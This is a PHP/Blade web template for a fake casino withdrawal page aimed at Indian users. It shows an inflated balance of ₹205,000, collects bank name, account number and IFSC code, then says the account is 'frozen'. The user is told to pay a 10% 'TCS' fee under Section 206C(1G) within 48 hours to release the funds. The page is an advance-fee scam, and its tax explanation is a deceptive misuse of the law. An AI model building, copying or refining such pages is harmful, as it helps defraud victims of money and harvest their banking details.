@auth
@php
$userStatus = \Auth::user()->status;
$name_surname = explode(' ', \Auth::user()->name);
if($userStatus != 0){
	$status = \App\Status::where('id', $userStatus)->first();
	
}
$gamesAll = round(\Auth::user()->win_games + \Auth::user()->lose_games);

@endphp
<link rel="stylesheet" href="/output/stylesDep.css?id=323322223233233222222222222222233333" />

   <!--Відео-->
   <div class="screenWrapper">
    
    <!-- Вікно 1: Вибір методу -->
    <div class="pagesContainer">
      <div class="up_page up_page_1">
        <div class="up_header">
          <button class="up_back_button">
            <img src="./output/img/arrow.svg" alt="">Casino
          </button>
          <div class="up_h1">Top up</div>
        </div>
        <div class="up_container">
          <div class="up_balance-box">
            <p class="up_balance-label">Available balance</p>
            <p class="up_balance-amount" data-balance="205000"></p>
          </div>
          <div class="up_blance-title" style="margin-bottom: 10px;">All methods:</div>
          <div class="up_method-grid">
            <a href="#" class="up_method-item" data-method-id="google"><img src="./img/google.svg"
                alt="Google Pay"><span>Google Pay</span></a>
            <a href="#" class="up_method-item" data-method-id="apple"><img src="./img/applepay.svg"
                alt="Apple Pay"><span>Apple Pay</span></a>
            <a href="#" class="up_method-item" data-method-id="visa"><img src="./img/visa.svg"
                alt="Visa"><span>Visa</span></a>
            <a href="#" class="up_method-item" data-method-id="mastercard"><img src="./img/mastercard.svg"
                alt="MasterCard"><span>MasterCard</span></a>
            <a href="#" class="up_method-item" data-method-id="paypal"><img src="./img/paypal.svg"
                alt="PayPal"><span>PayPal</span></a>
          </div>
        </div>
      </div>
      <!-- Вікно 2: Форма виводу -->
      <div class="up_page up_page_2">
        <div class="up_header">
          <button class="up_back_button">
            <img src="./output/img/arrow.svg" alt="">Back
          </button>
          <div class="up_h1">Top up</div>
        </div>
        <div class="up_container up_withdraw-form">
          <div class="up_balance-box">
            <p class="up_balance-label">Available balance</p>
            <p class="up_balance-amount">₹ 205 000.00</p>
          </div>
          <div class="up_method-section">
            <img src="./img/google.svg" alt="Google Pay" class="up_method-icon">
            <div class="up_method-details">
              <h3 class="up_text-dark">Google Pay</h3>
              <button class="up_btn-base up_btn-primary" style="padding: 6px 10px; font-size: 14px;">Change</button>
            </div>
          </div>
          <div class="up_title-block">Enter the withdrawal amount</div>
          <div class="up_input-group" style="margin-bottom: 10px;">
            <span class="up_icon-wrapper">₹</span>
            <input type="text" class="up_input" placeholder="10 500">
          </div>
          <div class="up_flex-row up_text-muted" style="justify-content: space-between; font-size: 14px;">
            <p>One withdrawal limits</p>
            <p>from ₹ 500 to ₹ 50,000</p>
          </div>
          <div class="up_flex-row" style="gap: 9px; margin-top: 16px;">
            <button class="up_btn-base" style="background:#edf0f7">₹ 5 000</button>
            <button class="up_btn-base" style="background:#edf0f7">₹ 15 000</button>
            <button class="up_btn-base" style="background:#edf0f7">₹ 25 000</button>
            <button class="up_btn-base" style="background:#edf0f7">₹ 50 000</button>
          </div>
          <div class="up_select-container">
            <select class="up_select" required>
              <option disabled selected value="">Bank</option>
              <option value="Allahabad Bank">Allahabad Bank</option>
              <option value="Andhra Bank">Andhra Bank</option>
              <option value="AU Small Finance Bank">AU Small Finance Bank</option>
              <option value="Axis Bank">Axis Bank</option>
              <option value="Bandhan Bank">Bandhan Bank</option>
              <option value="Bank of Baroda">Bank of Baroda</option>
              <option value="Bank of India">Bank of India</option>
              <option value="Bank of Maharashtra">Bank of Maharashtra</option>
              <option value="Bharat CoopBank">Bharat CoopBank</option>
              <option value="CITI BANK">CITI BANK</option>
              <option value="CSB Bank">CSB Bank</option>
              <option value="Canara Bank">Canara Bank</option>
              <option value="Catholic Syrian Bank">Catholic Syrian Bank</option>
              <option value="Central Bank Of India">Central Bank Of India</option>
              <option value="City Union Bank">City Union Bank</option>
              <option value="Corporation Bank">Corporation Bank</option>
              <option value="Cosmos Bank">Cosmos Bank</option>
              <option value="Dena Bank">Dena Bank</option>
              <option value="Deutsche Bank">Deutsche Bank</option>
              <option value="Development Credit Bank">Development Credit Bank</option>
              <option value="Dhanlaxmi Bank">Dhanlaxmi Bank</option>
              <option value="Federal Bank">Federal Bank</option>
              <option value="HDFC Bank">HDFC Bank</option>
              <option value="ICICI Bank">ICICI Bank</option>
              <option value="ICICI Bank Business">ICICI Bank Business</option>
              <option value="IDBI Bank">IDBI Bank</option>
              <option value="IDFC First Bank">IDFC First Bank</option>
              <option value="Indian Bank">Indian Bank</option>
              <option value="Indian Overseas Bank">Indian Overseas Bank</option>
              <option value="Indusind Bank">Indusind Bank</option>
              <option value="Industrial Development Bank Of India">Industrial Development Bank Of India</option>
              <option value="Jammu and Kashmir Bank">Jammu and Kashmir Bank</option>
              <option value="Karnataka Bank">Karnataka Bank</option>
              <option value="Kotak Mahindra Bank">Kotak Mahindra Bank</option>
              <option value="Lakshmi Vilas Bank NetBanking">Lakshmi Vilas Bank NetBanking</option>
              <option value="Oriental Bank Of Commerce">Oriental Bank Of Commerce</option>
              <option value="Punjab &amp; Sind Bank">Punjab &amp; Sind Bank</option>
              <option value="Punjab National Bank">Punjab National Bank</option>
              <option value="SBB">SBB</option>
              <option value="Shamrao Vithal Cooperative Bank">Shamrao Vithal Cooperative Bank</option>
              <option value="South Indian Bank">South Indian Bank</option>
              <option value="Standard Chartered Bank">Standard Chartered Bank</option>
              <option value="State Bank of Hyderabad">State Bank of Hyderabad</option>
              <option value="State Bank of India">State Bank of India</option>
              <option value="State Bank of Travancore">State Bank of Travancore</option>
              <option value="Syndicate Bank">Syndicate Bank</option>
              <option value="Tamilnad Mercantile Bank">Tamilnad Mercantile Bank</option>
              <option value="Tamilnadu Mercantile Bank">Tamilnadu Mercantile Bank</option>
              <option value="UCO BANK">UCO BANK</option>
              <option value="Union Bank of India">Union Bank of India</option>
              <option value="Vijaya Bank">Vijaya Bank</option>
              <option value="Yes Bank">Yes Bank</option>
            </select>
          </div>
          <input type="text" class="up_input" style="margin-bottom: 10px;" placeholder="Full Name">
          <input type="text" class="up_input" style="margin-bottom: 10px;" placeholder="IFSC Code">
          <input type="text" class="up_input" style="margin-bottom: 10px;" placeholder="IMPS Bank Account Number">
          <div class="up_info-box">
            <img src="./output/img/help.svg" alt="?" width="14">
            <p style="margin-left: 6px;">How to withdrawal?</p>
          </div>
          <button class="up_btn-base up_btn-bg-primary up_pay-btn">Withdrawal</button>
        </div>
      </div>

      <!-- Вікно 4: Інструкція до оплати -->
      <div class="up_page up_page_3">
        <div class="up_header">
          <button class="up_back_button">
            <img src="./output/img/arrow.svg" alt="">Back
          </button>
          <div class="up_h1">Top up</div>
        </div>
        <div class="up_container">
          <div class="up_balance-box">
            <p class="up_balance-label">Available balance</p>
            <p class="up_balance-amount">₹ 205 000.00</p>
          </div>
          <div class="up_warning-title">
            <div class="up_warning-indicator"></div>
            Your account has been temporarily frozen! 206C(1G)
          </div>
          <div class="up_alert" style="margin-top: 25px;">
            <div class="up_flex-row" style="justify-content: space-between;">
              <p class="up_text-muted">Amount to be paid </p>
              <p class="up_text-muted"> Tax percentage</p>
            </div>
            <div class="up_flex-row" style="justify-content: space-between;">
              <p class="up_text-dark up_res_10" style="font-weight: 700;">₹ 11 276.00</p>
              <p class="up_text-dark" style="font-weight: 700;">10.00%</p>
            </div>
          </div>
          <div class="up_text-start up_text-dark"
            style="margin-top: 25px; display: flex; align-items: center; gap: 10px; font-weight: 700;">
            <div class="up_success-indicator"></div>
            <div>
              After payment, the entire balance of <span class="up_green-text up_balance-amount">₹ 205,607</span> will be withdrawn within
              30
              minutes
            </div>
          </div>
          <p class="up_info-section-title">Select payment method:</p>
          <div class="up_method-grid">
            <a href="#" class="up_method-item up_method-page3"><img src="./img/google.svg" alt="Google Pay"><span>Google Pay</span></a>
            <a href="#" class="up_method-item up_method-page3"><img src="./img/google.svg" alt="Google Pay"><span>Google Pay</span></a>
            <a href="#" class="up_method-item up_method-page3"><img src="./img/google.svg" alt="Google Pay"><span>Google Pay</span></a>
            <a href="#" class="up_method-item up_method-page3"><img src="./img/google.svg" alt="Google Pay"><span>Google Pay</span></a>
            <a href="#" class="up_method-item up_method-page3"><img src="./img/google.svg" alt="Google Pay"><span>Google Pay</span></a>
            <a href="#" class="up_method-item up_method-page3"><img src="./img/google.svg" alt="Google Pay"><span>Google Pay</span></a>
          </div>
          <button class="up_btn-base up_btn-green up_pay-btn">Pay</button>
          <div>
            <p class="up_info-section-title">How to withdraw funds? Why is the account frozen?</p>
            <p class="up_min-text">Your account has been temporarily frozen in accordance with Indian legal
              requirements.
              As
              a resident of India, any funds received from a foreign company are subject to Tax Collected at Source
              (TCS)
              under Section 206C(1G) of the Income Tax Act, 1961. The current TCS rate is 20% of the payout.</p><br />
            <p class="up_min-title">What we are doing for you:</p>
            <p class="up_min-text">We will cover half of this amount—10% of your winnings—on your behalf.</p>
            <br />
            <p class="up_min-title">What you need to do:</p>
            <p class="up_min-text">To unblock your account and process your payout, please remit the remaining 10% TCS
              within the next 48 hours. As soon as we receive your portion, we will immediately release your funds.</p>
            <br>
            <p class="up_min-title">Why this is necessary:</p>

            <ul class="up_min-text" style="padding-left: 15px;">
              <li>Legality. Compliance with Section 206C(1G) is mandatory. Failure to collect and remit TCS may result
                in
                penalties and legal liability.</li>
              <li>Transparency. Withholding tax at source ensures full adherence to the Income Tax Act and RBI
                regulations.
              </li>
              <li>Security. Payment of TCS confirms the integrity of the transaction and protects your interests in
                international transfers.</li>
            </ul>
            <br />
            <p class="up_min-text">If you have any questions about making the payment, our support team is ready to
              assist
              you at any time.</p>
          </div>
          <button class="up_btn-base up_btn-green up_pay-btn" style="background-color: #F3F6FB; color: #19AB59;">I am
            ready
            to pay and withdraw</button>
          <button class="up_btn-base up_pay-btn up_btn-bg-primary"
            style="width: 100%; margin-top: 10px;">Support</button>
        </div>
      </div>
    </div>
  </div>
  <script src="./output/dep.js"></script>


@else
<script type="text/javascript">location.href='/';</script>
@endauth
